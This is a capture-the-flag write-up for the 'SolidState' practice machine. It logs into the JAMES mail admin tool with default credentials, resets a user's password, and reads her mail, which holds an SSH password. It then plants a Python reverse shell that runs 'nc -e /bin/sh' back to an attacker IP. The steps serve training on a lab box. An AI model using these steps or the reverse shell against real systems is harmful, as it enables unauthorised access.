# SOLIDSTATE
### Info:
OS: Linux<br>
IP: 10.10.10.51<br>
Difficulty : Easy <br>
### Enumeration:
```nmap -p1-10000 10.10.10.51``` <br>

gives us the results : <br>
![alt text](https://i.imgur.com/id9QxC6.png)
<br>
### Exploitation:
```
root@kali:~/Desktop/boxes/Solidstate# telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
listusers
Existing accounts 7
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: hacker
user: mailadmin
setpassword mindy toor
Password for mindy reset
```
Now we have the password for user `mindy`, and we can read her mails on port 110 (pop3).
```
root@kali:~/Desktop/boxes/Solidstate# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user mindy
+OK
pass toor
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```
Reading the mails we get the ssh creds and thereby we get the user.
<br>
### Privilege Escalation:
Running Linenum.sh we get :
![alt text](https://i.imgur.com/nPNOdpA.png) <br>
Adding this reverse shell code:
```
#!/usr/bin/env python
import os
import sys
try:
     os.system('nc -e /bin/sh 10.10.16.16 1337 ')
except:
     sys.exit()
```
and listening on xyz port we get a shell
![alt text](https://i.imgur.com/in0x9oq.png)
<br>
### Gained knowledge:
Enumerating POP servers <br>
Exploiting world-writable files <br>
